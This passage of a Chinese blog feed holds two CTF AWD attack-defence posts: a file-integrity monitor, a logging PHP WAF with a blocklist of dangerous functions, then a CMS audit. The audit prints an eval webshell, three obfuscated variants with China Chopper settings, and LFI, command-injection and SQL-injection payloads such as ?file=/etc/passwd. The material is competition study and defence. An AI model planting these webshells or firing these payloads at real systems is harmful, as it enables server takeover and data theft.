class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">#use: python file_check.py ./</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import shutil</span><br><span class="line">import ntpath</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = &#123;&#125;      # 文件MD5字典</span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"># 特殊文件路径字符串</span><br><span class="line">Special_path_str = &#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;</span><br><span class="line">bakstring = &#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;</span><br><span class="line">logstring = &#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br><span class="line">webshellstring = &#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br><span class="line">difffile = &#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;</span><br><span class="line"></span><br><span class="line">Special_string = &#x27;drops_log&#x27;  # 免死金牌</span><br><span class="line">UNICODE_ENCODING = &quot;utf-8&quot;</span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = r&quot;\?%02x&quot;</span><br><span class="line"></span><br><span class="line"># 文件路径字典</span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</span><br><span class="line">Special_path = &#123;</span><br><span class="line">    &#x27;bak&#x27; : os.path.realpath(os.path.join(spec_base_path, bakstring)),</span><br><span class="line">    &#x27;log&#x27; : os.path.realpath(os.path.join(spec_base_path, logstring)),</span><br><span class="line">    &#x27;webshell&#x27; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</span><br><span class="line">    &#x27;difffile&#x27; : os.path.realpath(os.path.join(spec_base_path, difffile)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def isListLike(value):</span><br><span class="line">    return isinstance(value, (list, tuple, set))</span><br><span class="line"></span><br><span class="line"># 获取Unicode编码</span><br><span class="line">def getUnicode(value, encoding=None, noneToNull=False):</span><br><span class="line"></span><br><span class="line">    if noneToNull and value is None:</span><br><span class="line">        return NULL</span><br><span class="line"></span><br><span class="line">    if isListLike(value):</span><br><span class="line">        value = list(getUnicode(_, encoding, noneToNull) for _ in value)</span><br><span class="line">        return value</span><br><span class="line"></span><br><span class="line">    if isinstance(value, unicode):</span><br><span class="line">        return value</span><br><span class="line">    elif isinstance(value, basestring):</span><br><span class="line">        while True:</span><br><span class="line">            try:</span><br><span class="line">                return unicode(value, encoding or UNICODE_ENCODING)</span><br><span class="line">            except UnicodeDecodeError, ex:</span><br><span class="line">                try:</span><br><span class="line">                    return unicode(value, UNICODE_ENCODING)</span><br><span class="line">                except:</span><br><span class="line">                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            return unicode(value)</span><br><span class="line">        except UnicodeDecodeError:</span><br><span class="line">            return unicode(str(value), errors=&quot;ignore&quot;)</span><br><span class="line"></span><br><span class="line"># 目录创建</span><br><span class="line">def mkdir_p(path):</span><br><span class="line">    import errno</span><br><span class="line">    try:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    except OSError as exc:</span><br><span class="line">        if exc.errno == errno.EEXIST and os.path.isdir(path):</span><br><span class="line">            pass</span><br><span class="line">        else: raise</span><br><span class="line"></span><br><span class="line"># 获取当前所有文件路径</span><br><span class="line">def getfilelist(cwd):</span><br><span class="line">    filelist = []</span><br><span class="line">    for root,subdirs, files in os.walk(cwd):</span><br><span class="line">        for filepath in files:</span><br><span class="line">            originalfile = os.path.join(root, filepath)</span><br><span class="line">            if Special_path_str not in originalfile:</span><br><span class="line">                filelist.append(originalfile)</span><br><span class="line">    return filelist</span><br><span class="line"></span><br><span class="line"># 计算机文件MD5值</span><br><span class="line">def calcMD5(filepath):</span><br><span class="line">    try:</span><br><span class="line">        with open(filepath,&#x27;rb&#x27;) as f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            hash = md5obj.hexdigest()</span><br><span class="line">            return hash</span><br><span class="line">    except Exception, e:</span><br><span class="line">        print u&#x27;[!] getmd5_error : &#x27; + getUnicode(filepath)</span><br><span class="line">        print getUnicode(e)</span><br><span class="line">        try:</span><br><span class="line">            ORIGIN_FILE_LIST.remove(filepath)</span><br><span class="line">            FILE_MD5_DICT.pop(filepath, None)</span><br><span class="line">        except KeyError, e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"># 获取所有文件MD5</span><br><span class="line">def getfilemd5dict(filelist = []):</span><br><span class="line">    filemd5dict = &#123;&#125;</span><br><span class="line">    for ori_file in filelist:</span><br><span class="line">        if Special_path_str not in ori_file:</span><br><span class="line">            md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">            if md5:</span><br><span class="line">                filemd5dict[ori_file] = md5</span><br><span class="line">    return filemd5dict</span><br><span class="line"></span><br><span class="line"># 备份所有文件</span><br><span class="line">def backup_file(filelist=[]):</span><br><span class="line">    # if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:</span><br><span class="line">    for filepath in filelist:</span><br><span class="line">        if Special_path_str not in filepath:</span><br><span class="line">            shutil.copy2(filepath, Special_path[&#x27;bak&#x27;])</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print u&#x27;---------start------------&#x27;</span><br><span class="line">    for value in Special_path:</span><br><span class="line">        mkdir_p(Special_path[value])</span><br><span class="line">    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span><br><span class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG</span><br><span class="line">    print u&#x27;[*] pre work end!&#x27;</span><br><span class="line">    while True:</span><br><span class="line">        file_list = getfilelist(CWD)</span><br><span class="line">        # 移除新上传文件</span><br><span class="line">        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))</span><br><span class="line">        if len(diff_file_list) != 0:</span><br><span class="line">            # import pdb;pdb.set_trace()</span><br><span class="line">            for filepath in diff_file_list:</span><br><span class="line">                try:</span><br><span class="line">                    f = open(filepath, &#x27;r&#x27;).read()</span><br><span class="line">                except Exception, e:</span><br><span class="line">                    break</span><br><span class="line">                if Special_string not in f:</span><br><span class="line">                    try:</span><br><span class="line">                        print u&#x27;[*] webshell find : &#x27; + getUnicode(filepath)</span><br><span class="line">                        shutil.move(filepath, os.path.join(Special_path[&#x27;webshell&#x27;], ntpath.basename(filepath) + &#x27;.txt&#x27;))</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;%getUnicode(filepath)</span><br><span class="line">                    try:</span><br><span class="line">                        f = open(os.path.join(Special_path[&#x27;log&#x27;], &#x27;log.txt&#x27;), &#x27;a&#x27;)</span><br><span class="line">                        f.write(&#x27;newfile: &#x27; + getUnicode(filepath) + &#x27; : &#x27; + str(time.ctime()) + &#x27;\n&#x27;)</span><br><span class="line">                        f.close()</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[-] log error : file move error: &#x27; + getUnicode(e)</span><br><span class="line"></span><br><span class="line">        # 防止任意文件被修改,还原被修改文件</span><br><span class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">        for filekey in md5_dict:</span><br><span class="line">            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">                try:</span><br><span class="line">                    f = open(filekey, &#x27;r&#x27;).read()</span><br><span class="line">                except Exception, e:</span><br><span class="line">                    break</span><br><span class="line">                if Special_string not in f:</span><br><span class="line">                    try:</span><br><span class="line">                        print u&#x27;[*] file had be change : &#x27; + getUnicode(filekey)</span><br><span class="line">                        shutil.move(filekey, os.path.join(Special_path[&#x27;difffile&#x27;], ntpath.basename(filekey) + &#x27;.txt&#x27;))</span><br><span class="line">                        shutil.move(os.path.join(Special_path[&#x27;bak&#x27;], ntpath.basename(filekey)), filekey)</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;%getUnicode(filekey)</span><br><span class="line">                    try:</span><br><span class="line">                        f = open(os.path.join(Special_path[&#x27;log&#x27;], &#x27;log.txt&#x27;), &#x27;a&#x27;)</span><br><span class="line">                        f.write(&#x27;diff_file: &#x27; + getUnicode(filekey) + &#x27; : &#x27; + getUnicode(time.ctime()) + &#x27;\n&#x27;)</span><br><span class="line">                        f.close()</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[-] log error : done_diff: &#x27; + getUnicode(filekey)</span><br><span class="line">                        pass</span><br><span class="line">        time.sleep(2)</span><br><span class="line">        # print &#x27;[*] &#x27; + getUnicode(time.ctime()) </span><br></pre></td></tr></table></figure><h4 id="不死马清理："><a href="#不死马清理：" class="headerlink" title="不死马清理："></a>不死马清理：</h4><p><code>ps aux www|grep shell.php</code></p><p>找到pid后杀掉进程就可以，你删掉脚本是起不了作用的，因为php执行的时候已经把脚本读进去解释成opcode运行了</p><p>重启php等web服务</p><p>用一个<code>ignore_user_abort(true)</code>脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。</p><p>创建一个和不死马生成的马一样名字的文件夹。</p><h4 id="不死马、waf、抓流量的waf"><a href="#不死马、waf、抓流量的waf" class="headerlink" title="不死马、waf、抓流量的waf"></a>不死马、waf、抓流量的waf</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">不死马使用原理就是不断将的自己写入，造成进程占用，被删除后一秒就已经生成新的了，还有就是.XXX文件建立隐藏文件不死马。</span><br><span class="line">waf，脚本waf可以防止一般情况下的危险字符，但是不能报太大希望， </span><br></pre></td></tr></table></figure><p><code>require_once(&#39;waf.php&#39;);</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find /tmp/test/html -name <span class="string">&quot;*.php&quot;</span> | xargs sed -i <span class="string">&#x27;1s/^/&lt;?php include_once &quot;\/tmp\/waf.php&quot;;?&gt;\n /&#x27;</span></span><br><span class="line">````</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>抓流量waf，挂载后可以让防守队员_实时关注日志，一旦发现被getflag了，就通过日志相应的手法攻击别人 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**waf脚本**</span><br><span class="line"></span><br><span class="line">&gt; PHPWaf用来记录访问请求，通过分析访问请求来判断对方的攻击方式，作用是感知漏洞，判断攻击方式，从而修复漏洞。</span><br><span class="line"></span><br></pre></td></tr></table></figure><?php //部署waf可能会导致服务不可用，需要谨慎部署。    error_reporting(0);    define('LOG_FILENAME','log.txt');    function waf()    {        if (!function_exists('getallheaders')) {            function getallheaders() {                foreach ($_SERVER as $name => $value) {                    if (substr($name, 0, 5) == 'HTTP_')                        $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;                }                return $headers;            }        }        $get = $_GET;        $post = $_POST;        $cookie = $_COOKIE;        $header = getallheaders();        $files = $_FILES;        $ip = $_SERVER["REMOTE_ADDR"];        $method = $_SERVER['REQUEST_METHOD'];        $filepath = $_SERVER["SCRIPT_NAME"];                //rewirte shell which uploaded by others, you can do more        foreach ($_FILES as $key => $value) {            $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']);            file_put_contents($_FILES[$key]['tmp_name'], "virink");        }        unset($header['Accept']);//fix a bug        $input = array("Get"=>$get, "Post"=>$post, "Cookie"=>$cookie, "File"=>$files, "Header"=>$header);        //deal with        $pattern = "select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex";        $pattern .= "|file_put_contents|fwrite|curl|system|eval|assert";        $pattern .="|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore";        $pattern .="|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec";        $vpattern = explode("|",$pattern);        $bool = false;        foreach ($input as $k => $v) {            foreach($vpattern as $value){                foreach ($v as $kk => $vv) {                    if (preg_match( "/$value/i", $vv )){                        $bool = true;                        logging($input);                        break;                    }                }                if($bool) break;            }            if($bool) break;        }    }     function logging($var){        file_put_contents(LOG_FILENAME, "\r\n".time()."\r\n".print_r($var, true), FILE_APPEND);        // die() or unset($_GET) or unset($_POST) or unset($_COOKIE);    }    waf();?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">waf的激活方式：</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>php.ini选项：auto_prepend_file &#x3D;与auto_append_file &#x3D;包含waf，需要权限较高。</p></li><li><p>config.php 中包含waf</p></li><li><p>让所有的文件都包含waf</p></li></ol><p>&#96;&#96;&#96;</p><h3 id="0x07流量分析"><a href="#0x07流量分析" class="headerlink" title="0x07流量分析"></a>0x07流量分析</h3><ol><li>查看当前访问量前十的链接</li></ol><p><code>cat /var/log/apache2/access.log | cut -f4 -d | sort | uniq -c | sort -k -r | head -</code></p><ol start="2"><li><p>文件监控增删改查的文件使用脚本Monitor（一个简单的文件监控示例脚本，可以监控创建、删除、移动、属性修改操作，自动删除新增文件或目录。已使用pyinstaller打包成了linux可执行程序）</p></li><li><p>chattr +i 命令锁死网站目录和文件，防止其他队伍删除网站宕机。注：添加后不取消特殊权限 即使是root用户也无法删除&#x2F;修改文件</p><p>chattr -R +i &#x2F;var&#x2F;www&#x2F;html<br>chattr -R +i &#x2F;var&#x2F;www&#x2F;html&#x2F;*<br>(取消命令将+号改成- chattr -R -i &#x2F;var&#x2F;www&#x2F;html）</p></li><li><p>使用waf全局包含waf，注意waf的日志和weblogger日志与第二项文件监控冲突，建议建立文件夹将日志和weblogger日志放到指定文件夹中，避开文件监控，</p><p>sudo find &#x2F;var&#x2F;www&#x2F;html&#x2F;path_you_want -type f -path “*.php” | xargs sed -i “s&#x2F;&lt;?php&#x2F;&lt;?php\nrequire_once(’&#x2F;tmp&#x2F;waf.php’);\n&#x2F;g”<br>#意思就是查找需要加waf的目录下所有php文件，在头部添加一句，用require_once函数引入&#x2F;tmp&#x2F;waf.php文件。因为sed命令利用 &#x2F; 区分文件中的原字符串和修改的字符串，所以我们要对 &#x2F; 进行转义。类似于在单引号中再次使用单引号时我们也要用反斜杠转义。</p></li><li><p>后台一定要登陆后台，有没有弱口令，修改成强口令。</p></li><li><p>不只是后台，phpmyadmin、测试页面容易出现sql注入，rce之类的这些</p></li></ol><h2 id="AWD资源小合集"><a href="#AWD资源小合集" class="headerlink" title="AWD资源小合集:"></a>AWD资源小合集:</h2><p><a href="https://neversec.top/20190415/how-to-awd.html">https://neversec.top/20190415/how-to-awd.html</a></p><p><strong>参考网站：</strong></p><p><a href="https://blog.csdn.net/qq/_42114918/article/details/82785960#comments">https://blog.csdn.net/qq\_42114918/article/details/82785960#comments</a></p><p><a href="https://blog.csdn.net/qq/_43625917/article/details/96158713">https://blog.csdn.net/qq\_43625917/article/details/96158713</a></p><p><a href="http://www.admintony.com/AWD%E8%A5%BF%E7%9F%B3%E6%B2%B9%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93.html">http://www.admintony.com/AWD%E8%A5%BF%E7%9F%B3%E6%B2%B9%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93.html</a></p><p><a href="https://blog.csdn.net/like98k/article/details/80261603">https://blog.csdn.net/like98k/article/details/80261603</a></p><p><a href="http://www.8sec.cc/index.php/archives/97/">http://www.8sec.cc/index.php/archives/97/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF线下AWD攻防步骤总结：&quot;&gt;&lt;a href=&quot;#CTF线下AWD攻防步骤总结：&quot; class=&quot;headerlink&quot; title=&quot;CTF线下AWD攻防步骤总结：&quot;&gt;&lt;/a&gt;CTF线下AWD攻防步骤总结：&lt;/h1&gt;&lt;p&gt;ctf线下AWD攻防赛学习笔记：&lt;a</summary>
      
    
    
    
    <category term="AWD" scheme="https://lhhxs.github.io/categories/AWD/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="AWD" scheme="https://lhhxs.github.io/tags/AWD/"/>
    
    <category term="攻防" scheme="https://lhhxs.github.io/tags/%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>CTF AWD模式下简单的CMS代码审计</title>
    <link href="https://lhhxs.github.io/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8BAWD%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://lhhxs.github.io/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8BAWD%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2022-09-09T01:47:07.275Z</published>
    <updated>2022-09-09T14:23:42.094Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-AWD模式下简单的CMS代码审计"><a href="#CTF-AWD模式下简单的CMS代码审计" class="headerlink" title="CTF AWD模式下简单的CMS代码审计"></a>CTF AWD模式下简单的CMS代码审计</h1><p>ctf线下AWD攻防赛学习笔记：<a href="https://blog.csdn.net/qq_43442524/article/details/102653414">https://blog.csdn.net/qq_43442524&#x2F;article&#x2F;details&#x2F;102653414</a><br>CTF线下AWD攻防步骤总结：<a href="https://blog.csdn.net/qq_43442524/article/details/102652029">https://blog.csdn.net/qq_43442524&#x2F;article&#x2F;details&#x2F;102652029</a></p><p>今天先把去年的AWD代码审计一下,以后有时间就把今年的AWD代码审计写一下</p><h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include &#x27;header.php&#x27;;</span><br><span class="line">@eval($_REQUEST[&#x27;aa&#x27;]);</span><br><span class="line">echo &#x27;eval&#x27;;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMjAyMTA3NDMyMV8xNTcwNTE5MTk1NDkzLzA?x-oss-process=image/format,png"></p><p>首先打开index.php,一目了然,可以看到头文件有一句话木马,密码是<code>aa</code></p><p>这里使用中国菜刀可以直接连上一句话木马,进入服务器</p><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h4 id="了解一句话脚本的工作原理"><a href="#了解一句话脚本的工作原理" class="headerlink" title="了解一句话脚本的工作原理"></a>了解一句话脚本的工作原理</h4><h6 id="一句话脚本的工作原理："><a href="#一句话脚本的工作原理：" class="headerlink" title="一句话脚本的工作原理："></a>一句话脚本的工作原理：</h6><p>一句话恶意脚本分析服务端与客户端。(此处以php脚本语言简述原理）</p><p>一句话恶意脚本服务端就是我们要用来插入到php文件中的asp语句，（不仅仅是以php为后缀的数据库文件），该语句将回为触发，接收入侵者通过客户端提交的数据，执行并完成相应的操作，服务端的代码内容为<code>@eval($\_REQUEST\[‘aa’\]);</code> 其中aa可以自己修改</p><p>一句话恶意脚本客户端（即为中国菜刀主程序）用来向服务端提交控制数据的，提交的数据通过服务端构成完整的php功能语句并执行.</p><blockquote><p>中国菜刀的请求方式为post。</p></blockquote><h4 id="一句话脚本的变形"><a href="#一句话脚本的变形" class="headerlink" title="一句话脚本的变形"></a>一句话脚本的变形</h4><h5 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h5><p>加密类变形</p><p>php一句话恶意脚本带404页面,带MD5加密,可浏览器POST任意php代码执行. 代码如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo &quot;404 Not Found!&lt;/br&gt;&quot;; error_reporting(0);</span><br><span class="line">if(isset($_POST[&#x27;com&#x27;]) &amp;&amp; md5($_POST[&#x27;com&#x27;]) == &#x27;791dc312b38016ef998c1c146104cd5a&#x27; &amp;&amp; isset($_POST[&#x27;content&#x27;])) $content = strtr($_POST[&#x27;content&#x27;], &#x27;-_,&#x27;, &#x27;+/=&#x27;);eval(base64_decode($content));</span><br><span class="line">echo &quot;We&#x27;re sorry but the page your are looking for is Not Found...&quot;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>在菜刀里写<code>http://xx.xx.xx.xx/test.php</code></p><p>密码:<code>page</code></p><p>菜刀配置填：</p><p><code>＜O＞com=settoken&amp;content=ZXZhbCgkX1BPU1RbJ3BhZ2UnXSk7＜/O＞</code></p><h5 id="案例2-变量拼接类变形"><a href="#案例2-变量拼接类变形" class="headerlink" title="案例2 变量拼接类变形"></a>案例2 变量拼接类变形</h5><p>webshell的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&#x27;n985de9&#x27;];if(isset($s22))&#123;eval($s21($s22));&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>在菜刀里写<a href="http://xx.xx.xx.xx/test.php">http://xx.xx.xx.xx/test.php</a></p><p>密码是:<code>0</code></p><p>菜刀配置填：</p><p><code>＜O＞n985de9=QGV2YWwoJF9QT1NUWzBdKTs=＜/O＞</code></p><h5 id="案例3-加密拼接类变形"><a href="#案例3-加密拼接类变形" class="headerlink" title="案例3 加密拼接类变形"></a>案例3 加密拼接类变形</h5><p>webshell的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt; </span><br></pre></td></tr></table></figure><p>在菜刀里写<a href="http://xx.xx.xx.xx/test.php">http://xx.xx.xx.xx/test.php</a></p><p>连接密码：<code>1</code></p><h2 id="about-php"><a href="#about-php" class="headerlink" title="about.php"></a>about.php</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMjAyMTA3NDMyMV8xNTcwNTE5Mzg0OTgyLzA?x-oss-process=image/format,png"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTk5Mzg5MDMxXzE1NzA1MTk0MzQ5MDYvMA?x-oss-process=image/format,png"></p><p>可以看到这里打开了 <code>allow_url_include</code> 并且代码中有明显的<code>文件包含漏洞</code></p><p>payload为<code>?file=/etc/passwd</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMjAyMTA3NDMyMV8xNTcwNTE5NjgwOTc3LzA?x-oss-process=image/format,png"></p><p>具体的文件包含漏洞可以查看<a href="https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#5-proc-self-environ">这篇文章</a></p><h2 id="services-php"><a href="#services-php" class="headerlink" title="services.php"></a>services.php</h2><p>这里我们点击第三个选项<code>服务</code>,点击以后页面正常 这里我们去查看一下它的源码</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfNzM2NjcwMDMyXzE1NzA1MTk5Mzg4MzIvMA?x-oss-process=image/format,png"></p><p>发现有异常,这里是一个简单的命令执行漏洞</p><p>payload:?shell&#x3D;ls</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTk5Mzg5MDMxXzE1NzA1MjAzMTUzODkvMA?x-oss-process=image/format,png"></p><h2 id="contact-php"><a href="#contact-php" class="headerlink" title="contact.php"></a>contact.php</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTk5Mzg5MDMxXzE1NzA1MjAzNjM3NDQvMA?x-oss-process=image/format,png"></p><p>查看源码:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMjAyMTA3NDMyMV8xNTcwNTIwNDM2MzI1LzA?x-oss-process=image/format,png"></p><p>可以发现这里也是一个文件包含漏洞,不过相比上面那个有些复杂</p><p>payload:?path&#x3D;&#x2F;etc&#x2F;passwd</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfNzk2NDgwMzM2XzE1NzA1MjA1NDg0NjQvMA?x-oss-process=image/format,png"></p><p>爆出passwd文件</p><h2 id="footer-php"><a href="#footer-php" class="headerlink" title="footer.php"></a>footer.php</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfNzM2NjcwMDMyXzE1NzA1MjA1ODIyNjUvMA?x-oss-process=image/format,png"></p><p>返回主页 发现页面底端有异常</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTk5Mzg5MDMxXzE1NzA1MjA2NDY0OTQvMA?x-oss-process=image/format,png"></p><p>这里有简单的命令执行漏洞</p><p>注释即可</p><h2 id="admin页面"><a href="#admin页面" class="headerlink" title="admin页面"></a>admin页面</h2><p>在登陆界面</p><h3 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTQwOTA3NTY4M18xNTcwNTM1NjE0MDE3LzA?x-oss-process=image/format,png"></p><p>简单的sql注入</p><p>payload:<code>admin &#39; #</code></p><h2 id="header-php"><a href="#header-php" class="headerlink" title="header.php"></a>header.php</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTQwOTA3NTY4M18xNTcwNTM1NzU1ODAyLzA?x-oss-process=image/format,png"></p><p>这里是一个php命令执行漏洞</p><p>payload: <code>?p=cat /flag.txt</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTIxODk5OTkwNl8xNTcwNTM2OTk2MjU4LzA?x-oss-process=image/format,png"></p><p>好了,代码就差不多就审计到这里了,一些简单的后门漏洞等用D盾或审计工具可以找出来,要想提高自己的话尽量花点时间,自主审计</p>]]></content>
    
    
      
      
